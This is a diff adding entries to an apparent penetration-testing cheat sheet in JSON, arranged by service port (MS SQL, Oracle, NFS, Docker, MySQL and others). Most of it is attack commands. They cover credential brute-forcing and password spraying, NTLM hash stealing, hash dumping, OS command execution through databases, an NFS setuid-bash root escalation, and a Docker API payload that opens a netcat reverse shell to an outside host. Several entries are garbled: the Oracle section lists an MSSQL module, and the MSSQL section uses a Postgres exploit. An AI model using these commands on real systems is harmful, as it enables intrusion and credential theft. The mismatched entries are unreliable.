+     "command": "nmap -sV -p 1026 <IP>",
+     "command_desc": "Used to identify the service and its verison",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "nmap script scan",
+     "command": "nmap -sV --script vulners -p 1026 <IP>",
+     "command_desc": "nmap with the vulners script attempts to identify any known vulnerabilities in the service version",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "searchsploit",
+     "command": "searchsploit rusersd",
+     "command_desc": "searchsploit checks the local database for any existing exploits against rusersd",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "rusers",
+     "command": "rusers -l <IP>",
+     "command_desc": "The rusers command queries the rusersd service for information about logged-in users. If this is successful from an unauthorized system, it indicates a potential information disclosure vulnerability.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Brute force",
+     "command": "nmap --script=rpc-grind -p 1026 <IP>",
+     "command_desc": "The rpc-grind Nmap script attempts to brute-force the list of available RPC programs and procedures on the target, which can reveal other services running on the same port",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Metasploit",
+     "command": "search rusersd",
+     "command_desc": "Scanning internal hosts port for enumeration",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Nmap",
+     "command": "nmap -Pn -p 1026 <IP> --script=firewall-bypass",
+     "command_desc": "Verify if the port is properly protected by firewalls or access control lists.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "ms-sql-1433",
+   "name": "MS SQL",
+   "ports": [
+    1433
+   ],
+   "aliases": [
+    "ms-sql-s"
+   ],
+   "intro": "MS SQL (Microsoft SQL Server) is a relational database management system (RDBMS) used to store and manage data. Network pentesters exploit MS SQL by enumerating weak or default credentials, misconfigurations, and vulnerabilities to gain unauthorized access. They may also exploit SQL injection or abuse features like xp_cmdshell to execute system commands remotely.",
+   "rows": [
+    {
+     "phase": "Connect",
+     "method": "connect to ms sql using credentials",
+     "command": "impacket-mssqlclient -port 1433 DOMAIN/username:password@<target-ip>",
+     "command_desc": "connecting to MS Sql",
+     "description": "",
+     "remarks": "these can be performed if username and password are already known",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "impacket-mssqlclient -port 1433 DOMAIN/username:password@<target-ip> -windows-auth",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "sqsh -S <target-ip> -U username -P password",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Enumeration",
+     "method": "Metasploit",
+     "command": "msf> use auxiliary/scanner/mssql/mssql_ping",
+     "command_desc": "It identifies live SQL servers and gathers basic information about them, such as version and host details",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "nmap",
+     "command": "nmap --script ms-sql-info -p 1433 <target-ip>\nnmap --script ms-sql-config -p 1433 <target-ip>\nnmap --script ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 <target-ip>\nnmap --script ms-sql-* -p 1433 <target-ip>",
+     "command_desc": "Nmap script enumeration",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Brute Force Credentials",
+     "command": "netexec mssql <target-ip> -u username -p passwords.txt\n\nhydra -L usernames.txt –p password <target-ip> mssql\nhydra -l username –P passwords.txt <target-ip> mssql",
+     "command_desc": "using hydra and netexec tools to bruteforce creds",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Password Spraying Attack",
+     "command": "netexec mssql example.com -u usernames.txt -p 'password' --no-bruteforce --continue-on-success",
+     "command_desc": "If we found the specific user password, we might be able to find another user with the same password.",
+     "description": "",
+     "remarks": "If we found the specific user password, we might be able to find another user with the same password.",
+     "reference": ""
+    },
+    {
+     "phase": "Post Exploitation",
+     "method": "Metasploit",
+     "command": "msf> use auxiliary/admin/mssql/mssql_ntlm_stealer",
+     "command_desc": "Steal NTLM hash, before executing run Responder",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "msf> use admin/mssql/mssql_enum #Security checks\nmsf> use admin/mssql/mssql_enum_domain_accounts\nmsf> use admin/mssql/mssql_enum_sql_logins\nmsf> use auxiliary/admin/mssql/mssql_findandsampledata\nmsf> use auxiliary/scanner/mssql/mssql_hashdump\nmsf> use auxiliary/scanner/mssql/mssql_schemadump",
+     "command_desc": "Info gathering",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "msf> use auxiliary/admin/mssql/mssql_findandsampledata\nmsf> use auxiliary/admin/mssql/mssql_idf",
+     "command_desc": "Search for insteresting data",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Metasploit",
+     "command": "msfconsole\nmsf> use exploit/multi/postgres/postgres_copy_from_program_cmd_exec\nmsf> set rhosts <target-ip>\nmsf> set lhost <local-ip>\nmsf> set tablename <table_name>\nmsf> set username <username>\nmsf> set password <password>\nmsf> run\nshell",
+     "command_desc": "using msfconsle trying to create a new table and username and passwords",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Metasploit",
+     "command": "msf> use exploit/windows/mssql/mssql_linkcrawler\nmsf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate\nmsf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin",
+     "command_desc": "Priviledge escalation",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Command injection",
+     "command": "msf> use admin/mssql/mssql_exec #Execute commands\nmsf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload",
+     "command_desc": "we can inject OS commands into the mssql server",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "oracle-database-1521",
+   "name": "Oracle Database",
+   "ports": [
+    1521
+   ],
+   "aliases": [
+    "oracle-tns",
+    "oracle"
+   ],
+   "intro": "Oracle Database is a relational database management system (RDBMS) used for storing and retrieving large amounts of structured data. It typically runs on port 1521 (default for Oracle's TNS Listener). For network pentesters, it can be a target for identifying vulnerabilities, exploiting misconfigurations, or testing authentication mechanisms to gain unauthorized access to sensitive data.",
+   "rows": [
+    {
+     "phase": "Connect",
+     "method": "Enumerating using tnscmd tool",
+     "command": "./tnscmd.pl status -h 192.168.0.2",
+     "command_desc": "When enumerating Oracle the first step is to talk to the TNS-Listener that usually resides on the default port (1521/TCP). For this we have a simple tool called tnscmd/tnscmd10g",
+     "description": "",
+     "remarks": "these can be performed if username and password are already known",
+     "reference": ""
+    },
+    {
+     "phase": "Enumeration",
+     "method": "Enumerating the SID",
+     "command": "sudo oscanner -s 192.168.1.18   -P 8888",
+     "command_desc": "Oscanner is a brilliant security tool from cqure (some reason I cant find the a link that works) but it is available in Kali Linux — https://tools.kali.org/vulnerability-analysis/oscanner",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Hydra & Oracle SIDs",
+     "command": "./hydra -L <File of SIDs> -s 1521 (target default port) <target> oracle-sid",
+     "command_desc": "Use the following command syntax to brute-force SIDs",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "brute-force a listener password",
+     "command": "./hydra -P <Password File> -t <no of threads> -s 1521 (target default port) <target> oracle-listener",
+     "command_desc": "using hydra and netexec tools to bruteforce creds",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Hydra & Oracle SQL-Login",
+     "command": "./hydra -L <File of usernames> -P <File of Passwords> -s 1521 (target default port) <target> /<database name/SID>",
+     "command_desc": "command syntax to brute-force a listener password",
+     "description": "",
+     "remarks": "If we found the specific user password, we might be able to find another user with the same password.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "oscanner",
+     "command": "#apt install oscanner\noscanner -s <IP> -P <PORT>",
+     "command_desc": "An interesting tool is oscanner, which will try to get some valid SID and then it will brute-force for valid credentials and try to extract some information:",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Post Exploitation",
+     "method": "To login",
+     "command": "msf> use auxiliary/admin/mssql/mssql_ntlm_stealer",
+     "command_desc": "Steal NTLM hash, before executing run Responder",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "sqlplus <username>/<password>@<ip_address>/<SID>;",
+     "command_desc": "login using known credentials:",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "sqlplus",
+     "command": "sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';\n#Example:\nsqlplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'",
+     "command_desc": "If an account has system database priviledges (sysdba) or system operator (sysop) you may wish to try the following:",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Execute Code via Java Stored Procedure",
+     "command": "./odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND",
+     "command_desc": "we can inject OS commands into the oracle server",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Execute code via Scheduler",
+     "command": "./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec \"C:\\windows\\system32\\cmd.exe /c echo 123&gt;&gt;C:\\hacK\"",
+     "command_desc": "we can inject OS commands into the oracle server",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Elevating Privileges",
+     "command": "./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help",
+     "command_desc": "You can use the privesc module from odat to escalate privileges. In that link you can find several ways to escalate privileges using odat. : https://github.com/quentinhardy/odat/wiki/privesc",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "nfs-2049",
+   "name": "NFS",
+   "ports": [
+    2049
+   ],
+   "aliases": [
+    "nfs"
+   ],
+   "intro": "NFS (Network File System) is a distributed file system protocol that allows a user on a client computer to access files over a network as if they were on the local storage.\nNFS is often examined for vulnerabilities like misconfigurations, such as weak export rules or lack of authentication, which could allow unauthorized access to shared files or directories.",
+   "rows": [
+    {
+     "phase": "",
+     "method": "List NFS exports and check permissions",
+     "command": "nmap --script nfs-ls -p 2049 <target-ip>",
+     "command_desc": "To List NFS exports and check permissions",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Enumeration",
+     "method": "NFS Mounting",
+     "command": "showmount -e <IP>",
+     "command_desc": "To know which folder has the server available to mount you an ask it using",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Access to discovered NFS shares",
+     "command": "mount -t nfs 10.10.x.x:/export/home /mnt/connect_path mount -t nfs -o vers=2 10.10.x.x:/export/home /mnt/connect_path -o nolock",
+     "command_desc": "Trying to mount to your local machine. You should specify to use version 2 because it doesn't have any authentication or authorization.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "NFS Service Detection with Metasploit",
+     "command": "msf > use auxiliary/scanner/nfs/nfsmount\nmsf auxiliary(nfsmount) > set RHOSTS 10.10.x.x/24\nmsf auxiliary(nfsmount) > run",
+     "command_desc": "Using metasploit module to detect service",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Disk statistics and info from NFS share",
+     "command": "nmap --script nfs-statfs -p 2049 <target-ip>",
+     "command_desc": "to List NFS exports and check permissions",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Privilege Escalation using NFS misconfigurations",
+     "command": "#Attacker, as root user\nmkdir /tmp/pe\nmount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe\ncd /tmp/pe\ncp /bin/bash .\nchmod +s bash\n\n#Victim\ncd <SHAREDD_FOLDER>\n./bash -p #ROOT shell",
+     "command_desc": "This command sequence sets up an NFS share on an attacker’s machine to deliver a setuid bash binary, which allows a victim to execute a root shell by running the modified bash binary.",
+     "description": "",
+     "remarks": "Hope this needs permission from client",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "docker-2375-2376",
+   "name": "Docker",
+   "ports": [
+    2375,
+    2376
+   ],
+   "aliases": [
+    "docker"
+   ],
+   "intro": "The Docker API allows users and programs to interact with the Docker daemon to manage containers, images, networks, and more. When network pentesters encounter an open Docker API port (2375 or 2376), they can potentially exploit it to gain unauthorized access to the Docker daemon. This can lead to the ability to start or stop containers, extract sensitive information, or even gain control over the host system, depending on the configuration and security of the Docker instance.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "List images",
+     "command": "docker -H <target-ip>:2375 images",
+     "command_desc": "lists all Docker images on a remote Docker host",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "List Containers",
+     "command": "curl <ip>:2375/containers/json",
+     "command_desc": "retrieves a list of all Docker containers (both running and stopped) from a Docker daemon",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "List specific container",
+     "command": "curl <ip>:2375/containers/<id or name>/json",
+     "command_desc": "retrieves detailed information about a specific Docker container from the Docker daemon, including its configuration, state, and other metadata, by querying the Docker API on the specified IP address.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "List Logs of the container",
+     "command": "curl <ip>:2375/containers/<id or name>/logs?stderr=1&stdout=1",
+     "command_desc": "retrieves the logs of a specific Docker container, identified by its ID or name, from a remote Docker API on port 2375, including both standard error and standard output streams.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Inpsect changes of container",
+     "command": "curl <ip>:2375/containers/<id or name>/changes",
+     "command_desc": "queries the Docker API on the specified IP address and port to retrieve a list of filesystem changes made within a specific container, identified by its ID or name.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Getting shell of a container by running image",
+     "command": "docker -H <target-ip>:2375 run -v /:/mnt --rm -it <running-image-name> chroot /mnt sh",
+     "command_desc": "This command runs a Docker container on a remote host, mounting the entire filesystem (/) of the target to /mnt inside the container, and provides an interactive shell with root privileges using the chroot command",
+     "description": "",
+     "remarks": "Take permission from project lean and client to exploit",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Create/Start a New Container",
+     "command": "If we found the container image name, prepare a new container configuration named “image.json”.\n{\n  \"Image\": \"sweettoothinc:latest\",\n  \"Cmd\": [\"/bin/bash\"],\n  \"Binds\": [\"/:/mnt:rw\"]\n}\nThen create a new container using Docker Engine API.\ncurl -X POST -H \"Content-Type: application/json\" -d @image.json <ip>:2375/containers/create\nWe get the new container ID, so copy it.\nAfter that, start the new container.\ncurl -X POST <ip>:2375/containers/<new_container_id>/start",
+     "command_desc": "This command creates and starts a new Docker container with the image \"sweettoothinc\n\" using the Docker Engine API, binding the root directory (/) to /mnt within the container for read-write access",
+     "description": "",
+     "remarks": "Take permission from project lean and client to exploit",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Create a New Exec Instance",
+     "command": "curl -X POST -H \"Content-Type: application/json\" --data-binary '{\"AttachStdin\": true, \"AttachStdout\": true, \"AttachStderr\": true, \"Cmd\": [\"nc\", \"10.0.0.1\", \"4444\", \"-e\", \"/bin/bash\"], \"DetachKeys\": \"ctrl-p,ctrl-q\", \"Privileged\": true, \"Tty\": true}' <ip>:2375/containers/<new_container_id>/exec",
+     "command_desc": "This curl command sends a POST request to the Docker API at <ip>:2375 to execute a command within a container, specifically running a reverse shell (nc 10.0.0.1 4444 -e /bin/bash) with elevated privileges. We get a exec ID, so copy it.",
+     "description": "",
+     "remarks": "Take permission from project lean and client to exploit",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Start an Exec Instance & Reverse Shell",
+     "command": "Start a listener in local machine.\nnc -lvnp 4444\n\nNow start an exec instance and get a shell.\ncurl -X POST -H \"Content-Type: application/json\" --data-binary '{\"Detach\": false, \"Tty\": false}' <ip>:2375/exec/<exec_id>/start",
+     "command_desc": "Start a listener on the local machine with nc -lvnp 4444, then use curl to initiate a remote shell by sending a POST request to the Docker API endpoint at <ip>:2375/exec/<exec_id>/start",
+     "description": "",
+     "remarks": "Take permission from project lean and client to exploit",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "https-proxy-3128",
+   "name": "HTTP Proxy",
+   "ports": [
+    3128
+   ],
+   "aliases": [
+    "http-proxy",
+    "squid-http"
+   ],
+   "intro": "",
+   "rows": [
+    {
+     "phase": "What is Https Proxy",
+     "method": "Squid is a caching and forwarding HTTP web proxy. It has a wide variety of uses, including speeding up a web server by caching repeated requests, caching web, DNS and other computer network lookups for a group of people sharing network resources, and aiding security by filtering traffic. Although primarily used for HTTP and FTP, Squid includes limited support for several other protocols including Internet Gopher, SSL, TLS and HTTPS. Squid does not support the SOCKS protocol, unlike Privoxy, with which Squid can be used in order to provide SOCKS support.",
+     "command": "",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Enumeration",
+     "method": "Web Proxy",
+     "command": "curl --proxy http://<proxy ip>:3128 <target ip>",
+     "command_desc": "You can try to set this discovered service as proxy in your browser. However, if it's configured with HTTP authentication you will be prompted for usernames and password.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Nmap",
+     "command": "nmap --script http-proxy --proxy <proxy_ip>:3128 <target_ip>",
+     "command_desc": "This script can provide information about the proxy’s configuration and whether it requires authentication",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Nmap proxified",
+     "command": "http <ip> 3128 username passw0rd.",
+     "command_desc": "You can also try to abuse the proxy to scan internal ports proxifying nmap.\nConfigure proxychains to use the squid proxy adding he following line at the end of the proxichains.conf file: http 10.10.10.10 3128 For proxies requiring authentication, append credentials to the configuration by including the username and password at the end: http 10.10.10.10 3128 username passw0rd.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "mysql3306",
+   "name": "MySQL",
+   "ports": [
+    3306
+   ],
+   "aliases": [
+    "mysql"
+   ],
+   "intro": "MySQL is an open-source relational database management system (RDBMS) that typically uses port 3306; we can exploit this open port to attempt unauthorized access or data extraction from the database, even escalte the previledges to system",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Banner Grabbing",
+     "command": "nc -nv X.X.X.X 3306",
+     "command_desc": "this command uses netcat to perform a verbose connection attempt to the IP address X.X.X.X on port 3306, typically to check the availability of a MySQL server and retrives the banner",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Nmap scripts",
+     "command": "nmap -p 3306 <IP> --script mysql-*",
+     "command_desc": "uses Nmap to scan the specified IP address on port 3306 for MySQL services and runs all available MySQL-related scripts to identify vulnerabilities and gather information about the MySQL instance",
+     "description": "",
+     "remarks": "Performing an Nmap script scan can generate a lot of traffic, so please make sure to inform the project lead and the client before running the scan. It is better to select specific scripts and run them individually. You can find these scripts with the following command: ls -al /usr/share/nmap/scripts/ | grep -e mysql",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "User enumeration",
+     "command": "root@attackdefense:~# nmap -p 3306 192.102.118.3 --script mysql-enum\nStarting Nmap 7.70 (\nhttps://nmap.org\n ) at 2019-11-04 16:22 UTC\nNmap scan report for target-1 (192.102.118.3)\nHost is up (0.000059s latency).\n\nPORT     STATE SERVICE\n3306/tcp open  mysql\n| mysql-enum:\n|   Valid usernames:\n|     root:<empty> - Valid credentials\n|     user:<empty> - Valid credentials\n|     web:<empty> - Valid credentials\n|     guest:<empty> - Valid credentials\n|     test:<empty> - Valid credentials\n|     sysadmin:<empty> - Valid credentials\n|     administrator:<empty> - Valid credentials\n|     webadmin:<empty> - Valid credentials\n|     admin:<empty> - Valid credentials\n|     netadmin:<empty> - Valid credentials\n|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0\nMAC Address: 02:42:C0:66:76:03 (Unknown)",
+     "command_desc": "this command uses Nmap to scan port 3306 on the IP address 192.102.118.3 and runs the mysql-enum script to enumerate MySQL databases and gather information about the MySQL server",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "dump hashes",
+     "command": "root@attackdefense:~# nmap -p 3306 192.102.118.3 --script mysql-dump-hashes.nse --script-args='username=root,password='\nStarting Nmap 7.70 (\nhttps://nmap.org\n ) at 2019-11-04 16:33 UTC\nNmap scan report for target-1 (192.102.118.3)\nHost is up (0.000060s latency).\n\nPORT     STATE SERVICE\n3306/tcp open  mysql\n| mysql-dump-hashes:\n|   debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D\n|   filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B\n|   ultra:*827EC562775DC9CE458689D36687DCED320F34B0\n|   guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646\n|   sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0\n|   udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9\n|_  sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14\nMAC Address: 02:42:C0:66:76:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 0.40 seconds",
+     "command_desc": "Nmap to scan port 3306 on IP 192.102.118.3 and attempts to dump MySQL password hashes using the mysql-dump-hashes.nse script with provided root credentials. Note this require username",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Metasploit Modules",
+     "command": "msf5 > search mysql\n\nMatching Modules\n================\n   #   Name                                                  Disclosure Date  Rank       Check  Description\n   -   ----                                                  ---------------  ----       -----  -----------\n   1   auxiliary/admin/http/manageengine_pmp_privesc         2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection\n   2   auxiliary/admin/http/rails_devise_pass_reset          2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset\n   3   auxiliary/admin/mysql/mysql_enum                                       normal     No     MySQL Enumeration Module\n   4   auxiliary/admin/mysql/mysql_sql                                        normal     No     MySQL SQL Generic Query\n   5   auxiliary/admin/tikiwiki/tikidblib                    2006-11-01       normal     No     TikiWiki Information Disclosure\n   6   auxiliary/analyze/jtr_mysql_fast                                       normal     No     John the Ripper MySQL Password Cracker (Fast Mode)\n   7   auxiliary/gather/joomla_weblinks_sqli                 2014-03-02       normal     Yes    Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read\n   8   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal     Yes    MySQL Authentication Bypass Password Dump\n   9   auxiliary/scanner/mysql/mysql_file_enum                                normal     Yes    MYSQL File/Directory Enumerator\n   10  auxiliary/scanner/mysql/mysql_hashdump                                 normal     Yes    MYSQL Password Hashdump\n   11  auxiliary/scanner/mysql/mysql_login                                    normal     Yes    MySQL Login Utility\n   12  auxiliary/scanner/mysql/mysql_schemadump                               normal     Yes    MYSQL Schema Dump\n   13  auxiliary/scanner/mysql/mysql_version                                  normal     Yes    MySQL Server Version Enumeration\n   14  auxiliary/scanner/mysql/mysql_writable_dirs                            normal     Yes    MYSQL Directory Write Test\n   15  auxiliary/server/capture/mysql                                         normal     No     Authentication Capture: MySQL\n   16  exploit/linux/mysql/mysql_yassl_getname               2010-01-25       good       No     MySQL yaSSL CertDecoder::GetName Buffer Overflow\n   17  exploit/linux/mysql/mysql_yassl_hello                 2008-01-04       good       No     MySQL yaSSL SSL Hello Message Buffer Overflow\n   18  exploit/multi/http/manage_engine_dc_pmp_sqli          2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection\n   19  exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  No     Zpanel Remote Unauthenticated RCE\n   20  exploit/multi/mysql/mysql_udf_payload                 2009-01-16       excellent  No     Oracle MySQL UDF Payload Execution\n   21  exploit/unix/webapp/kimai_sqli                        2013-05-21       average    Yes    Kimai v0.9.2 'db_restore.php' SQL Injection\n   22  exploit/unix/webapp/wp_google_document_embedder_exec  2013-01-03       normal     Yes    WordPress Plugin Google Document Embedder Arbitrary File Disclosure\n   23  exploit/windows/mysql/mysql_mof                       2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows MOF Execution\n   24  exploit/windows/mysql/mysql_start_up                  2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse\n   25  exploit/windows/mysql/mysql_yassl_hello               2008-01-04       average    No     MySQL yaSSL SSL Hello Message Buffer Overflow\n   26  exploit/windows/mysql/scrutinizer_upload_exec         2012-07-27       excellent  Yes    Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential\n   27  post/linux/gather/enum_configs                                         normal     No     Linux Gather Configurations\n   28  post/linux/gather/enum_users_history                                   normal     No     Linux Gather User History\n   29  post/multi/manage/dbvis_add_db_admin                                   normal     No     Multi Manage DbVisualizer Add Db Admin",
+     "command_desc": "These are metasploit modules available for mysql, after running nmap scripts, if that shows any exploit is possible, use these modules to exploit",
+     "description": "",
+     "remarks": "Infor your project lead before executing these modules",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Enumerate directories",
+     "command": "msf5 auxiliary(scanner/mysql/mysql_file_enum) > show options\n\nModule options (auxiliary/scanner/mysql/mysql_file_enum):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   DATABASE_NAME  mysql            yes       Name of database to use\n   FILE_LIST                       yes       List of directories to enumerate\n   PASSWORD                        no        The password for the specified username\n   RHOSTS         192.102.118.3    yes       The target address range or CIDR identifier\n   RPORT          3306             yes       The target port (TCP)\n   TABLE_NAME     RxJwRpLp         yes       Name of table to use - Warning, if the table already exists its contents will be corrupted\n   THREADS        1                yes       The number of concurrent threads\n   USERNAME       root             yes       The username to authenticate as\nmsf5 auxiliary(scanner/mysql/mysql_file_enum) > set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt\nFILE_LIST => /usr/share/metasploit-framework/data/wordlists/directory.txt\nmsf5 auxiliary(scanner/mysql/mysql_file_enum) > run\n\n[+] 192.102.118.3:3306    - /tmp is a directory and exists\n[+] 192.102.118.3:3306    - /etc/passwd is a file and exists\n[+] 192.102.118.3:3306    - /etc/shadow is a file and exists\n[+] 192.102.118.3:3306    - /root is a directory and exists\n[+] 192.102.118.3:3306    - /home is a directory and exists\n[+] 192.102.118.3:3306    - /etc is a directory and exists\n[+] 192.102.118.3:3306    - /etc/hosts is a file and exists\n[+] 192.102.118.3:3306    - /usr/share is a directory and exists\n[+] 192.102.118.3:3306    - /etc is a directory and exists\n[*] 192.102.118.3:3306    - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf5 auxiliary(scanner/mysql/mysql_file_enum) >",
+     "command_desc": "This enumerares the files which can be accesseble by this user, it requires username and no password is require",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Mysql Brute-Force Attack",
+     "command": "use auxiliary/scanner/mysql/mysql_login\nset rhosts 192.168.1.108\nset user_file /root/Desktop/user.txt\nset pass_file /root/Desktop/pass.txt\nexploit",
+     "command_desc": "Brute forcing and guessing username and password for getting mysql credentials using metasploit module",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Default Login",
+     "command": "mysql -u <username> -h <hostname> -P <port> -p",
+     "command_desc": "Trying to authenticate to mysql shell without credentials",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Brute Force CredentialsUsing Hydra",
+     "command": "hydra -l username -P passwords.txt <target-ip> mysql\nhydra -L usernames.txt -p password <target-ip> mysql",
+     "command_desc": "Brute forcing and guessing username and password for getting mysql credentials using hydra tool",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "Post Exploitation",
+     "method": "SQL Statement Excution",
+     "command": "use auxiliary/admin/mysql/mysql_sql\nset rhosts 192.162.1.108\nset username root\nset password 123\nset sql show databases\nexploit",
+     "command_desc": "Running SQL queries with Login into Mysql.This module allows for simple SQL statements to be executed against a MySQL instance by given the appropriate credentials.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Extract Mysql-Schemadump Information",
+     "command": "use auxiliary/scanner/mysql/mysql_schemadump\nset rhosts 192.168.1.108\nset username root\nset password 123\nexploit",
+     "command_desc": "extracting information schema table with metasploit module with valid credentials",
+     "description": "",
+     "remarks": "",
